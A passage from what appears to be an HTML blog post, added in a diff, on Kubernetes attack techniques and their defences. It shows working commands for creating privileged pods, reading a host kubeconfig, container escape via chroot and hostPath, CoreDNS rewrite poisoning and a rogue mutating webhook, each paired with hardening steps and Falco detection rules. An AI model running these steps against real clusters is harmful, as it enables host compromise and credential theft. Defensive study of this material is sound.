+    "spec": {  
+      "containers": [  
+        {  
+          "name": "pwn",  
+          "image": "alpine",  
+          "command": ["/bin/sh", "-c", "sleep 999999"],  
+          "securityContext": {  
+            "privileged": true  
+          }  
+        }  
+      ]  
+    }  
+  }'</span> <span class="se">\ </span> 
+  <span class="nv">$API</span>/api/v1/namespaces/default/pods  
+
+kubectl get pods
+</code></pre></div></div>
+
+<p><img src="/img/kubernetes/kube-images/04-serviceaccount/07-privshell proof.png" alt="image29" width="720" class="mx-auto d-block" /></p>
+
+<p>With the privileged container, the attacker effectively achieves full host compromise as the privileged container has full Linux capabilities, access to the host device tree, ability to mount the host file system, load kernel modules, and read/write anywhere on the host.</p>
+
+<p><img src="/img/kubernetes/kube-images/04-serviceaccount/08-privshellpod.png" alt="image30" width="720" class="mx-auto d-block" /></p>
+
+<p>For example, the attacker could access a kubeconfig on the host by mounting the filesystem.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> /host  
+<span class="nb">cat</span> /host/home/heilan/.kube/config  
+</code></pre></div></div>
+
+<p><img src="/img/kubernetes/kube-images/04-serviceaccount/09-kubeconfigsteal.png" alt="image31" width="720" class="mx-auto d-block" /></p>
+
+<p>Or can also escape the container entirely</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chroot</span> /host /bin/bash  
+</code></pre></div></div>
+
+<h4 id="service-account-token-abuse-defensive-strategies">Service Account Token Abuse Defensive Strategies</h4>
+
+<h5 id="disable-automount-for-pods-that-dont-need-api">Disable automount for pods that don’t need API</h5>
+
+<p>Adding the flag <code class="language-plaintext highlighter-rouge">automountServiceAccountToken: false</code>  to pods prevents them from automatically mounting a ServiceAccount token at all. You can also prevent it at the service account level with the same flag.</p>
+
+<p>Disable automount at the pod level</p>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">apiVersion</span><span class="pi">:</span> <span class="s">v1</span>  
+<span class="na">kind</span><span class="pi">:</span> <span class="s">Pod</span>  
+<span class="na">metadata</span><span class="pi">:</span>  
+  <span class="na">name</span><span class="pi">:</span> <span class="s">secure-pod</span>  
+<span class="na">spec</span><span class="pi">:</span>  
+  <span class="na">automountServiceAccountToken</span><span class="pi">:</span> <span class="kc">false</span>  
+  <span class="na">containers</span><span class="pi">:</span>  
+    <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">app</span>  
+      <span class="na">image</span><span class="pi">:</span> <span class="s">nginx</span>  
+</code></pre></div></div>
+
+<h5 id="disable-service-account-token-automount">Disable Service Account Token automount</h5>
+
+<p>By default, Kubernetes mounts a service account token into every pod unless configured otherwise.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">apiVersion</span><span class="pi">:</span> <span class="s">v1</span>  
+<span class="na">kind</span><span class="pi">:</span> <span class="s">ServiceAccount</span>  
+<span class="na">metadata</span><span class="pi">:</span>  
+  <span class="na">name</span><span class="pi">:</span> <span class="s">restricted-sa</span>  
+<span class="na">automountServiceAccountToken</span><span class="pi">:</span> <span class="kc">false</span>  
+</code></pre></div></div>
+
+<h5 id="use-short-lived-tokens">Use short-lived tokens</h5>
+
+<p>Wherever possible, rely on Time-Bound Tokens generated through the <code class="language-plaintext highlighter-rouge">TokenRequest</code> API. If you need to use Long-Lived Tokens, rotate them regularly and avoid leaving them hardcoded into scripts.</p>
+
+<h4 id="service-account-token-abuse-detections">Service Account Token Abuse Detections</h4>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">CLI Token Usage by Local Process</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detect usage of kubectl or curl with explicit tokens</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">evt.type = execve and</span>
+    <span class="s">(proc.name = "kubectl" or proc.name = "curl") and</span>
+    <span class="s">(proc.cmdline contains "--token" or proc.cmdline contains "Authorization: Bearer")</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">Suspicious use of kubectl or curl with token |</span>
+    <span class="s">user=%user.name command=%proc.cmdline container=%container.name</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">NOTICE</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">T1528</span><span class="pi">,</span> <span class="nv">privilege_escalation</span><span class="pi">,</span> <span class="nv">serviceaccount</span><span class="pi">]</span>
+
+<span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">Pod ServiceAccount Token File Access</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detect attempts to read the Kubernetes ServiceAccount token from a pod filesystem</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">evt.is_open_read = true and</span>
+    <span class="s">(container.id != host) and</span>
+    <span class="s">fd.name = "/var/run/secrets/kubernetes.io/serviceaccount/token" and</span>
+    <span class="s">not proc.cmdline in ("meta-collector run", "kube-controller", "hostpath-provis", "coredns -conf /etc/coredns/Corefile", "calico-node -status-reporter", "calico-node -felix", "calico-node -allocate-tunnel-addrs")</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">Pod reading its service account token file |</span>
+    <span class="s">user=%user.name container=%container.name process=%proc.cmdline</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">NOTICE</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">T1528</span><span class="pi">,</span> <span class="nv">credential_access</span><span class="pi">,</span> <span class="nv">serviceaccount</span><span class="pi">]</span>
+
+<span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">Privileged or Host-Level Container Creation</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detect creation of Kubernetes pods that include privileged containers or host-level access</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">ka.verb = "create" and</span>
+    <span class="s">ka.target.resource = "pods" and</span>
+    <span class="s">ka.req.pod.containers.privileged intersects (true) and</span>
+    <span class="s">not ka.user.name contains "system:serviceaccount:kube-system:"</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">Privileged or host-level container created in namespace=%ka.target.namespace</span>
+    <span class="s">by=%ka.user.name pod=%ka.resp.name</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">CRITICAL</span>
+  <span class="na">source</span><span class="pi">:</span> <span class="s">k8s_audit</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">T1610</span><span class="pi">,</span> <span class="nv">privilege-escalation</span><span class="pi">,</span> <span class="nv">container</span><span class="pi">,</span> <span class="nv">runtime</span><span class="pi">]</span>
+</code></pre></div></div>
+
+<h3 id="malicious-admission-controllers"><strong>Malicious Admission Controllers</strong></h3>
+
+<h4 id="understanding-admission-controllers">Understanding Admission Controllers</h4>
+
+<p>Admission controllers act as another layer of access control in Kubernetes. After a request is authenticated and authorized, admission controllers either validate or mutate the object before it is written to <code class="language-plaintext highlighter-rouge">ETCD</code>.</p>
+
+<p>There are two types of dynamic admission controllers: <code class="language-plaintext highlighter-rouge">ValidatingWebhookConfiguration</code> and <code class="language-plaintext highlighter-rouge">MutatingWebhookConfiguration</code>. Validating webhooks review the object and either allow or deny it. Mutating controllers have the ability to modify the object through JSON patches. For example, if a mutating webhook was configured, a pod creation request will be modified without the user’s explicit knowledge before it is deployed.</p>
+
+<p><img src="/img/kubernetes/kube-images/05-mac/01-admissioncontrol.png" alt="image32" width="720" class="mx-auto d-block" /></p>
+
+<p>To list current webhooks in the cluster:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get mutatingwebhookconfigurations  
+kubectl get validatingwebhookconfigurations  
+</code></pre></div></div>
+
+<p><img src="/img/kubernetes/kube-images/05-mac/02-getwebhook.png" alt="image33" width="720" class="mx-auto d-block" /></p>
+
+<p><img src="/img/kubernetes/kube-images/05-mac/03-describemutating.png" alt="image34" width="720" class="mx-auto d-block" /></p>
+
+<p>An attacker with the ability to create or modify webhooks can influence the behavior of the entire cluster from behind the scenes.</p>
+
+<h4 id="rogue-mutatingwebhookconfiguration">Rogue MutatingWebhookConfiguration</h4>
+
+<p>Rogue mutating webhooks expose a supply chain backdoor inside the control plane. For example, an attacker with the ability to <a href="https://blog.rewanthtammana.com/creating-malicious-admission-controllers">deploy a mutating webhook</a> could inject a privileged initContainer into every Pod creation request:</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">apiVersion</span><span class="pi">:</span> <span class="s">admissionregistration.k8s.io/v1</span>  
+<span class="na">kind</span><span class="pi">:</span> <span class="s">MutatingWebhookConfiguration</span>  
+<span class="na">metadata</span><span class="pi">:</span>  
+  <span class="na">name</span><span class="pi">:</span> <span class="s">demo-webhook</span>  
+<span class="na">webhooks</span><span class="pi">:</span>  
+<span class="pi">-</span> <span class="na">admissionReviewVersions</span><span class="pi">:</span>  
+  <span class="pi">-</span> <span class="s">v1</span>  
+  <span class="pi">-</span> <span class="s">v1beta1</span>  
+  <span class="na">clientConfig</span><span class="pi">:</span>  
+    <span class="na">caBundle</span><span class="pi">:</span>   
+    <span class="na">service</span><span class="pi">:</span>  
+      <span class="na">name</span><span class="pi">:</span> <span class="s">webhook-server</span>  
+      <span class="na">namespace</span><span class="pi">:</span> <span class="s">webhook-demo</span>  
+      <span class="na">path</span><span class="pi">:</span> <span class="s">/mutate</span>  
+      <span class="na">port</span><span class="pi">:</span> <span class="s">443</span>  
+  <span class="na">failurePolicy</span><span class="pi">:</span> <span class="s">Fail</span>  
+  <span class="na">matchPolicy</span><span class="pi">:</span> <span class="s">Equivalent</span>  
+  <span class="na">name</span><span class="pi">:</span> <span class="s">webhook-server.webhook-demo.svc</span>  
+  <span class="na">namespaceSelector</span><span class="pi">:</span> <span class="pi">{}</span>  
+  <span class="na">objectSelector</span><span class="pi">:</span> <span class="pi">{}</span>  
+  <span class="na">reinvocationPolicy</span><span class="pi">:</span> <span class="s">Never</span>  
+  <span class="na">rules</span><span class="pi">:</span>  
+  <span class="pi">-</span> <span class="na">apiGroups</span><span class="pi">:</span>  
+    <span class="pi">-</span> <span class="s2">"</span><span class="s">"</span>  
+    <span class="na">apiVersions</span><span class="pi">:</span>  
+    <span class="pi">-</span> <span class="s">v1</span>  
+    <span class="na">operations</span><span class="pi">:</span>  
+    <span class="pi">-</span> <span class="s">CREATE</span>  
+    <span class="na">resources</span><span class="pi">:</span>  
+    <span class="pi">-</span> <span class="s">pods</span>  
+    <span class="na">scope</span><span class="pi">:</span> <span class="s1">'</span><span class="s">*'</span>  
+  <span class="na">sideEffects</span><span class="pi">:</span> <span class="s">None</span>  
+  <span class="na">timeoutSeconds</span><span class="pi">:</span> <span class="s">10</span>  
+</code></pre></div></div>
+<p><img src="/img/kubernetes/kube-images/05-mac/04-initcontainer.png" alt="image35" width="720" class="mx-auto d-block" /></p>
+
+<p>This would allow the attacker’s external server to modify the spec of every single pod regardless of who created it. Even if administrators rotate credentials or delete compromised workloads, the malicious webhook would continue to modify future deployments.</p>
+
+<h4 id="malicious-admission-controllers-defensive-strategies">Malicious Admission Controllers Defensive Strategies</h4>
+
+<h5 id="restrict-who-can-change-admission-configurations">Restrict who can change admission configurations</h5>
+
+<p>RBAC can be used to lock down admission configuration objects.</p>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">kind</span><span class="pi">:</span> <span class="s">Role</span>  
+<span class="na">apiVersion</span><span class="pi">:</span> <span class="s">rbac.authorization.k8s.io/v1</span>  
+<span class="na">metadata</span><span class="pi">:</span>  
+  <span class="na">name</span><span class="pi">:</span> <span class="s">admission-admin</span>  
+  <span class="na">namespace</span><span class="pi">:</span> <span class="s">kube-system</span>  
+<span class="na">rules</span><span class="pi">:</span>  
+<span class="pi">-</span> <span class="na">apiGroups</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">admissionregistration.k8s.io"</span><span class="pi">]</span>  
+  <span class="na">resources</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">mutatingwebhookconfigurations"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">validatingwebhookconfigurations"</span><span class="pi">]</span>  
+  <span class="na">verbs</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">get"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">list"</span><span class="pi">]</span>  
+</code></pre></div></div>
+
+<h4 id="admission-controller-detections">Admission Controller Detections</h4>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">Modify Admission Webhook Configuration</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detect creation or modification of Mutating/ValidatingWebhookConfigurations</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">ka.target.resource in (mutatingwebhookconfigurations, validatingwebhookconfigurations) and</span>
+    <span class="s">ka.verb in (create, patch, update)</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">Potential malicious admission controller change |</span>
+    <span class="s">user=%ka.user.name verb=%ka.verb resource=%ka.target.resource name=%ka.target.name</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">NOTICE</span>
+  <span class="na">source</span><span class="pi">:</span> <span class="s">k8s_audit</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">persistence</span><span class="pi">,</span> <span class="nv">T1562</span><span class="pi">,</span> <span class="nv">T1204</span><span class="pi">,</span> <span class="nv">admission</span><span class="pi">,</span> <span class="nv">backdoor</span><span class="pi">]</span>
+<span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">Read Admission Webhook Configurations</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detect attempts to list or get admission controller configurations</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">ka.target.resource in (mutatingwebhookconfigurations, validatingwebhookconfigurations)</span>
+    <span class="s">and ka.verb in (list, get)</span>
+    <span class="s">and not (ka.user.name  in ("system:serviceaccount:kube-system:replicaset-controller", "system:kube-controller-manager", "system:apiserver"))</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">Enumeration of admission controllers |</span>
+    <span class="s">user=%ka.user.name verb=%ka.verb resource=%ka.target.resource</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">NOTICE</span>
+  <span class="na">source</span><span class="pi">:</span> <span class="s">k8s_audit</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">admission</span><span class="pi">,</span> <span class="nv">recon</span><span class="pi">]</span>
+<span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">Delete Admission Webhook Configuration</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detect deletion of admission controller configurations</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">ka.target.resource in (mutatingwebhookconfigurations, validatingwebhookconfigurations) and</span>
+    <span class="s">ka.verb=delete</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">Admission webhook deleted |</span>
+    <span class="s">user=%ka.user.name resource=%ka.target.resource name=%ka.target.name</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">NOTICE</span>
+  <span class="na">source</span><span class="pi">:</span> <span class="s">k8s_audit</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">persistence</span><span class="pi">,</span> <span class="nv">admission</span><span class="pi">,</span> <span class="nv">T1562</span><span class="pi">]</span>  
+</code></pre></div></div>
+
+<h3 id="coredns-poisoning"><strong>CoreDNS Poisoning</strong></h3>
+
+<h4 id="understanding-coredns">Understanding CoreDNS</h4>
+
+<p>CoreDNS is a flexible and extensible DNS server that can serve as the Kubernetes cluster DNS. CoreDNS can be used in place of <code class="language-plaintext highlighter-rouge">kube-dns</code> in clusters  and for <code class="language-plaintext highlighter-rouge">kubeadm</code> v.134, it is the only supported cluster DNS application.</p>
+
+<p>Whenever a pod needs to resolve a DNS name, it queries the DNS service. CoreDNS checks if the query matches a Kubernetes service name pattern. If it matches, CoreDNS queries the Kubernetes API to get the current service endpoints and returns the correct IP address.</p>
+
+<p><img src="/img/kubernetes/kube-images/06-coredns/01-dns-test-init.png" alt="image37" width="720" class="mx-auto d-block" /></p>
+
+<p>CoreDNS uses a <code class="language-plaintext highlighter-rouge">Corefile</code> for configuration. This file is typically stored and mounted from a <code class="language-plaintext highlighter-rouge">ConfigMap</code> in the <code class="language-plaintext highlighter-rouge">kube-system</code> namespace. Tampering with the configuration of CoreDNS can redirect, spoof, or tamper with name resolution in the cluster. For example, an attacker might change an endpoint like <code class="language-plaintext highlighter-rouge">postgres.default.svc.cluster.local</code> to their own in order to capture credentials and inspect traffic then proxy traffic onward.</p>
+
+<h4 id="configmap-manipulation">ConfigMap Manipulation</h4>
+
+<p>An attacker with access to the ConfigMap can alter DNS resolution for the entire cluster.</p>
+
+<p>To view the current CoreDNS configuration:</p>
+
+<p><code class="language-plaintext highlighter-rouge">kubectl get configmap coredns -n kube-system -o yaml</code></p>
+
+<p><img src="/img/kubernetes/kube-images/06-coredns/02-default.png" alt="image38" width="720" class="mx-auto d-block" /></p>
+
+<p>An attacker could modify the ConfigMap and add rewrite rules or custom host entries. The following could be added to redirect all queries for <code class="language-plaintext highlighter-rouge">api.demo.svc.cluster.local</code> to an attacker controlled domain.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="s">rewrite name api.demo.svc.cluster.local attacker-svc.evil.svc.cluster.local</span>  
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">-n</span> kube-system edit configmap coredns  
+</code></pre></div></div>
+<p><img src="/img/kubernetes/kube-images/06-coredns/04-modifiedcorefile.png" alt="image40" width="720" class="mx-auto d-block" /></p>
+
+<p>After this is applied by restarting CoreDNS, we can see that <code class="language-plaintext highlighter-rouge">api.demo.svc.cluster.local</code> is pointing to the attacker’s IP:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">-n</span> kube-system rollout restart deployment coredns  
+</code></pre></div></div>
+
+<p><img src="/img/kubernetes/kube-images/06-coredns/03-attacker-test.png" alt="image39" width="720" class="mx-auto d-block" /></p>
+
+<h4 id="coredns-poisoning-defensive-strategies">CoreDNS Poisoning Defensive Strategies</h4>
+
+<h5 id="restrict-coredns-configmap-access">Restrict CoreDNS ConfigMap Access</h5>
+
+<p>The most critical defense is limiting who can modify the CoreDNS ConfigMap. Use RBAC to ensure only cluster administrators and automated systems can modify DNS configuration.</p>
+
+<h5 id="implement-configmap-immutability">Implement ConfigMap Immutability</h5>
+
+<p>Since Kubernetes, v1.21, secrets and ConfigMaps are able to be set as immutable. Setting a ConfigMap to immutable can be done by setting the <code class="language-plaintext highlighter-rouge">immutable</code> field to true.</p>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">apiVersion</span><span class="pi">:</span> <span class="s">v1</span>  
+<span class="na">kind</span><span class="pi">:</span> <span class="s">ConfigMap</span>  
+<span class="na">metadata</span><span class="pi">:</span>  
+  <span class="s">...</span>  
+<span class="na">data</span><span class="pi">:</span>  
+  <span class="s">...</span>  
+<span class="na">immutable</span><span class="pi">:</span> <span class="kc">true</span>  
+</code></pre></div></div>
+<p>Once this condition is set, it is impossible to revert the change. You can only delete and recreate the ConfigMap. Doing so would also mean recreating pods that have a mount point to the deleted ConfigMap.</p>
+
+<h4 id="coredns-detections-in-falco">CoreDNS Detections in Falco</h4>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">CoreDNS Rewrite Rule Added</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detect addition of rewrite rules in CoreDNS ConfigMap</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">ka.verb in (create, update, patch) and</span>
+    <span class="s">ka.target.resource = "configmaps" and</span>
+    <span class="s">ka.req.configmap.name = "coredns" and</span>
+    <span class="s">ka.req.configmap.obj contains "rewrite"</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">CoreDNS rewrite rule added or modified (user=%ka.user.name verb=%ka.verb req=%ka.req.configmap.obj)</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">WARNING</span>
+  <span class="na">source</span><span class="pi">:</span> <span class="s">k8s_audit</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">T1543</span><span class="pi">,</span> <span class="nv">poisoning</span><span class="pi">,</span> <span class="nv">coredns</span><span class="pi">]</span>
+
+<span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">CoreDNS ConfigMap Modified</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detects modifications to the CoreDNS ConfigMap</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">ka.req.configmap.name = "coredns" and</span>
+    <span class="s">ka.target.namespace = "kube-system" and</span>
+    <span class="s">ka.target.resource = "configmaps" and</span>
+    <span class="s">ka.verb in ("create", "update", "patch")</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">CoreDNS ConfigMap modified by unauthorized user</span>
+    <span class="s">(user=%ka.user.name verb=%ka.verb </span>
+    <span class="s">target=%ka.target.name namespace=%ka.target.namespace</span>
+    <span class="s">source_ips=%ka.sourceips user_agent=%ka.useragent)</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">WARNING</span>
+  <span class="na">source</span><span class="pi">:</span> <span class="s">k8s_audit</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">T1543</span><span class="pi">,</span> <span class="nv">poisoning</span><span class="pi">,</span> <span class="nv">coredns</span><span class="pi">]</span>
+
+<span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">Unusual CoreDNS Access Attempt</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detect attempts to GET or LIST the CoreDNS ConfigMap</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">ka.verb in ("get", "list") and</span>
+    <span class="s">ka.target.resource = "configmaps" and</span>
+    <span class="s">ka.req.configmap.name = "coredns" and</span>
+    <span class="s">ka.target.namespace = "kube-system"</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">Unauthorized access attempt to CoreDNS ConfigMap (user=%ka.user.name verb=%ka.verb)</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">NOTICE</span>
+  <span class="na">source</span><span class="pi">:</span> <span class="s">k8s_audit</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">discovery</span><span class="pi">,</span> <span class="nv">reconaissance</span><span class="pi">,</span> <span class="nv">coredns</span><span class="pi">]</span>
+</code></pre></div></div>
+
+<h3 id="writable-volume-mounts"><strong>Writable Volume Mounts</strong></h3>
+
+<p>Containers are designed to be stateless and any storage within them does not persist on reboot. This allows containers to remain consistent and portable but it can also create challenges when applications need to maintain state across restarts or persist important information.That’s where Volumes come in. Persistent Volumes allow pods to store data even if there’s a crash or reboot.</p>
+
+<p>A Volume Mount defines where the volume is mounted in the container. It effectively bridges the volume and the container’s internal directory structure, creating a connection between external storage and the container’s filesystem.</p>
+
+<p>As an example:</p>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">apiVersion</span><span class="pi">:</span> <span class="s">v1</span>  
+<span class="na">kind</span><span class="pi">:</span> <span class="s">Pod</span>  
+<span class="na">metadata</span><span class="pi">:</span>  
+  <span class="na">name</span><span class="pi">:</span> <span class="s">example-pod</span>  
+<span class="na">spec</span><span class="pi">:</span>  
+  <span class="na">containers</span><span class="pi">:</span>  
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">app</span>  
+    <span class="na">image</span><span class="pi">:</span> <span class="s">nginx</span>  
+    <span class="na">volumeMounts</span><span class="pi">:</span>  
+    <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">data-volume</span>  
+      <span class="na">mountPath</span><span class="pi">:</span> <span class="s">/usr/share/nginx/html</span>  
+  <span class="na">volumes</span><span class="pi">:</span>  
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">data-volume</span>   
+    <span class="na">hostPath</span><span class="pi">:</span>  
+      <span class="na">path</span><span class="pi">:</span> <span class="s">/data/html</span>  
+</code></pre></div></div>
+<p>In this configuration anything written to <code class="language-plaintext highlighter-rouge">/usr/share/nginx/html/</code> inside the container is stored in <code class="language-plaintext highlighter-rouge">/data/html</code> on the host.<br />
+<img src="/img/kubernetes/kube-images/07-wvm/01-demo.png" alt="image41" width="720" class="mx-auto d-block" /></p>
+
+<p>Kubernetes supports a variety of volume types. As of Kubernetes 1.34, many cloud-based volume types such as <code class="language-plaintext highlighter-rouge">awsElasticBlockStore</code>, <code class="language-plaintext highlighter-rouge">azureDisk</code>, <code class="language-plaintext highlighter-rouge">cinder</code>, and <code class="language-plaintext highlighter-rouge">azureFile</code> have been deprecated in favor of third party storage drivers through the Container Storage Interface (CSI) instead. That being said, there are still numerous volume types still supported. Most notably:</p>
+
+<ul>
+  <li>ConfigMap</li>
+  <li>emptyDir</li>
+  <li>hostPath</li>
+  <li>persistentVolumeClaim</li>
+  <li>Secret</li>
+</ul>
+
+<p>ConfigMap - provides a way to inject configuration data into pods, allowing applications to access configuration files as if they were regular files.</p>
+
+<p>emptyDir - creates an initially empty volume that exists as long as the pod is running. All containers in the pod can read and write the same files in the volume, making it useful for sharing data between containers in the same pod.</p>
+
+<p>hostPath - mounts a file or directory from the host node’s filesystem into the pod.</p>
+
+<p>persistentVolumeClaim (PVC) - allows pods to request storage that persists beyond the pod’s lifecycle. They abstract the underlying storage implementation.</p>
+
+<p>Secret - specifically designed for sensitive information like passwords, OAuth tokens, and SSH keys. They are base64-encoded and can be mounted as files or exposed as environment variables.</p>
+
+<h4 id="hostpath-abuse">hostPath Abuse</h4>
+
+<p>The Kubernetes documentation warns against using <code class="language-plaintext highlighter-rouge">hostPath</code> because of the security risks, instead it recommends users to define a <code class="language-plaintext highlighter-rouge">local</code> Persistent Volume and use it in its place. <code class="language-plaintext highlighter-rouge">hostPath</code> can give containers direct access to the host filesystem, leading to container escapes.</p>
+
+<p>Let’s take for example, a configuration where a container has a <code class="language-plaintext highlighter-rouge">hostPath</code> mount pointing to the root directory.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">apiVersion</span><span class="pi">:</span> <span class="s">v1</span>  
+<span class="na">kind</span><span class="pi">:</span> <span class="s">Pod</span>  
+<span class="na">metadata</span><span class="pi">:</span>  
+  <span class="na">name</span><span class="pi">:</span> <span class="s">root-hostpath-demo</span>  
+<span class="na">spec</span><span class="pi">:</span>  
+  <span class="na">containers</span><span class="pi">:</span>  
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">attacker</span>  
+    <span class="na">image</span><span class="pi">:</span> <span class="s">alpine:latest</span>  
+    <span class="na">securityContext</span><span class="pi">:</span>  
+      <span class="na">privileged</span><span class="pi">:</span> <span class="kc">true</span>  
+    <span class="na">command</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">tail"</span><span class="pi">]</span>  
+    <span class="na">args</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">-f"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">/dev/null"</span><span class="pi">]</span>  
+    <span class="na">volumeMounts</span><span class="pi">:</span>  
+    <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">root-volume</span>  
+      <span class="na">mountPath</span><span class="pi">:</span> <span class="s">/host</span>  
+  <span class="na">volumes</span><span class="pi">:</span>  
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">root-volume</span>  
+    <span class="na">hostPath</span><span class="pi">:</span>  
+      <span class="na">path</span><span class="pi">:</span> <span class="s">/</span>  
+      <span class="na">type</span><span class="pi">:</span> <span class="s">Directory</span>  
+</code></pre></div></div>
+
+<p>With this configuration, the attacker has read and write access to the entire host filesystem. They can read sensitive files, modify system configurations, or plant malicious binaries. This is essentially a complete compromise of the host node.<br />
+<img src="/img/kubernetes/kube-images/07-wvm/02-root-demo.png" alt="image42" width="720" class="mx-auto d-block" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nb">exec</span> <span class="nt">-it</span> root-hostpath-demo <span class="nt">--</span> <span class="nb">chroot</span> /host sh  
+</code></pre></div></div>
+
+<p><img src="/img/kubernetes/kube-images/07-wvm/03-chroot.png" alt="image43" width="720" class="mx-auto d-block" /></p>
+
+<p>Although, this configuration isn’t one that you would likely see in the wild. A much more likely configuration is this one:</p>
